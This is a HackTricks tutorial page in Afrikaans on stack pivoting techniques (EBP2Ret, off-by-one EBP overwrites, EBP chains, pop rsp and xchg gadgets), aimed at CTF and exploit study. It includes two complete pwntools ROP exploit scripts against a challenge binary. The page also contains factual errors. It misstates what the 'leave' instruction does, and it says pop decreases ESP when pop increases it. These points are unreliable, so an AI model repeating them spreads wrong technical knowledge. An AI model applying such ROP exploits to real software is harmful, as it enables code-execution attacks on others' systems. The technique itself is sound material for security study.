# Stokpunt Verskuiwing - EBP2Ret - EBP-ketting

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## Basiese Inligting

Hierdie tegniek maak gebruik van die vermo√´ om die **Base Pointer (EBP)** te manipuleer om die uitvoering van meerdere funksies aan mekaar te koppel deur sorgvuldige gebruik van die EBP-register en die **`leave; ret`** instruksievolgorde.

As 'n herinnering, beteken **`leave`** basies:
```
mov       ebp, esp
pop       ebp
ret
```
En aangesien die **EBP in die stapel** voor die EIP is, is dit moontlik om dit te beheer deur die stapel te beheer.

### EBP2Ret

Hierdie tegniek is veral nuttig wanneer jy die EBP-register kan **verander maar geen direkte manier het om die EIP-register te verander nie**. Dit maak gebruik van die gedrag van funksies wanneer hulle klaar is met uitvoer.

As jy tydens die uitvoering van `fvuln` 'n **vals EBP** in die stapel kan inspuit wat na 'n area in die geheue wys waar jou shellcode se adres gele√´ is (plus 4 byte om die `pop`-operasie te akkommodeer), kan jy die EIP indirek beheer. Wanneer `fvuln` terugkeer, word die ESP na hierdie gekonstrueerde plek ingestel, en die daaropvolgende `pop`-operasie verminder ESP met 4, **wat dit effektief laat wys na 'n adres wat deur die aanvaller daar gestoor is.**\
Let op hoe jy **2 adresse moet weet**: Die een waar ESP gaan, waar jy die adres moet skryf wat deur ESP aangedui word.

#### Uitbuiting Konstruksie

Eerstens moet jy 'n **adres weet waar jy arbitr√™re data / adresse kan skryf**. Die ESP sal hierheen wys en die eerste `ret` **uitvoer**.

Dan moet jy die adres weet wat deur `ret` gebruik word wat **arbitr√™re kode uitvoer**. Jy kan gebruik:

* 'n geldige [**ONE\_GADGET**](https://github.com/david942j/one\_gadget) adres.
* Die adres van **`system()`** gevolg deur **4 rommel byte** en die adres van `"/bin/sh"` (x86-bits).
* Die adres van 'n **`jump esp;`** gadget ([**ret2esp**](../rop-return-oriented-programing/ret2esp-ret2reg.md)) gevolg deur die **shellcode** om uit te voer.
* 'n paar [**ROP**](../rop-return-oriented-programing/) ketting

Onthou dat voor enige van hierdie adresse in die beheerde deel van die geheue, moet daar **`4` byte** wees as gevolg van die **`pop`** deel van die `leave`-instruksie. Dit sou moontlik wees om hierdie 4B te misbruik om 'n **tweede vals EBP** in te stel en die uitvoering voort te sit.

#### Off-By-One Uitbuiting

Daar is 'n spesifieke variasie van hierdie tegniek bekend as 'n "Off-By-One Uitbuiting". Dit word gebruik wanneer jy slegs die minst betekenisvolle byte van die EBP kan **verander**. In so 'n geval moet die geheueplek wat die adres om na te spring met die **`ret`** stoor, die eerste drie byte deel met die EBP, wat 'n soortgelyke manipulasie met meer beperkte toestande toelaat.\
Gewoonlik word die byte 0x00 verander om so ver as moontlik te spring.

Dit is ook algemeen om 'n RET-glybaan in die stapel te gebruik en die werklike ROP-ketting aan die einde te plaas om dit waarskynliker te maak dat die nuwe ESP binne die RET-glybaan wys en die finale ROP-ketting uitgevoer word.

### **EBP Ketting**

Dus, deur 'n beheerde adres in die `EBP`-inskrywing van die stapel te plaas en 'n adres na `leave; ret` in `EIP`, is dit moontlik om die `ESP` na die beheerde `EBP`-adres van die stapel te **skuif**.

Nou word die **`ESP`** beheer deur te wys na 'n gewenste adres en die volgende instruksie om uit te voer is 'n `RET`. Om hiervan misbruik te maak, is dit moontlik om hierdie in die beheerde ESP-plek te plaas:

* **`&(volgende vals EBP)`** -> Laai die nuwe EBP as gevolg van `pop ebp` van die `leave`-instruksie
* **`system()`** -> Geroep deur `ret`
* **`&(leave;ret)`** -> Geroep nadat die stelsel eindig, dit sal ESP na die valse EBP skuif en weer begin
* **`&("/bin/sh")`**-> Param vir `system`

Op hierdie manier is dit moontlik om verskeie valse EBPs aan mekaar te koppel om die vloei van die program te beheer.

Dit is soos 'n [ret2lib](../rop-return-oriented-programing/ret2lib/), maar meer kompleks sonder skynbare voordeel, maar dit kan interessant wees in sommige grensgevalle.

Verder het jy hier 'n [**voorbeeld van 'n uitdaging**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/leave) wat hierdie tegniek met 'n **stapel lek** gebruik om 'n wenfunksie te roep. Dit is die finale lading van die bladsy:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
0x0,               # rbp (could be the address of anoter fake RBP)
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,
elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (just get to RBP)

payload += flat(
buffer,         # Load leak address in RBP
LEAVE_RET       # Use leave ro move RSP to the user ROP chain and ret to execute it
)

pause()
p.sendline(payload)
print(p.recvline())
```
## EBP mag dalk nie gebruik word nie

Soos [**verduidelik in hierdie pos**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#off-by-one-1), as 'n bin√™re l√™er met sekere optimaliserings gekompileer word, kry die **EBP nooit beheer oor ESP nie**, daarom sal enige aanval wat werk deur die beheer van EBP basies misluk omdat dit geen werklike effek het nie.\
Dit is omdat die **proloog en epiloog verander** as die bin√™re l√™er geoptimaliseer is.

* **Nie geoptimaliseer nie:**
```bash
push   %ebp         # save ebp
mov    %esp,%ebp    # set new ebp
sub    $0x100,%esp  # increase stack size
.
.
.
leave               # restore ebp (leave == mov %ebp, %esp; pop %ebp)
ret                 # return
```
* **Geoptimeer:**
```bash
push   %ebx         # save ebx
sub    $0x100,%esp  # increase stack size
.
.
.
add    $0x10c,%esp  # reduce stack size
pop    %ebx         # restore ebx
ret                 # return
```
## Ander maniere om RSP te beheer

### **`pop rsp`** apparaat

[**Op hierdie bladsy**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp) kan jy 'n voorbeeld vind van hierdie tegniek. Vir hierdie uitdaging was dit nodig om 'n funksie met 2 spesifieke argumente te roep, en daar was 'n **`pop rsp` gadget** en daar is 'n **leak vanaf die stok**:
```python
# Code from https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp
# This version has added comments

from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16) # Leak from the stack indicating where is the input of the user
log.success(f'Buffer: {hex(buffer)}')

POP_CHAIN = 0x401225       # pop all of: RSP, R13, R14, R15, ret
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229     # pop RSI and R15

# The payload starts
payload = flat(
0,                 # r13
0,                 # r14
0,                 # r15
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,               # r15
elf.sym['winner']
)

payload = payload.ljust(104, b'A')     # pad to 104

# Start popping RSP, this moves the stack to the leaked address and
# continues the ROP chain in the prepared payload
payload += flat(
POP_CHAIN,
buffer             # rsp
)

pause()
p.sendline(payload)
print(p.recvline())
```
### xchg \<reg>, rsp-toestel
```
pop <reg>                <=== return pointer
<reg value>
xchg <reg>, rsp
```
### jmp esp

Kyk na die ret2esp tegniek hier:

{% content-ref url="../rop-return-oriented-programing/ret2esp-ret2reg.md" %}
[ret2esp-ret2reg.md](../rop-return-oriented-programing/ret2esp-ret2reg.md)
{% endcontent-ref %}

## Verwysings & Ander Voorbeelde

* [https://bananamafia.dev/post/binary-rop-stackpivot/](https://bananamafia.dev/post/binary-rop-stackpivot/)
* [https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)
* [https://guyinatuxedo.github.io/17-stack\_pivot/dcquals19\_speedrun4/index.html](https://guyinatuxedo.github.io/17-stack\_pivot/dcquals19\_speedrun4/index.html)
* 64 bits, off by one exploitation with a rop chain starting with a ret sled
* [https://guyinatuxedo.github.io/17-stack\_pivot/insomnihack18\_onewrite/index.html](https://guyinatuxedo.github.io/17-stack\_pivot/insomnihack18\_onewrite/index.html)
* 64 bit, no relro, canary, nx and pie. The program grants a leak for stack or pie and a WWW of a qword. First get the stack leak and use the WWW to go back and get the pie leak. Then use the WWW to create an eternal loop abusing `.fini_array` entries + calling `__libc_csu_fini` ([more info here](../arbitrary-write-2-exec/www2exec-.dtors-and-.fini\_array.md)). Abusing this "eternal" write, it's written a ROP chain in the .bss and end up calling it pivoting with RBP.

## ARM64

In ARM64, the **prologue and epilogues** of the functions **don't store and retrieve the SP registry** in the stack. Therefore, by default, you **won't be able to control the SP registry** by overwriting some data inside the stack.



<details>

<summary><strong>Leer AWS hak van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**offisi√´le PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
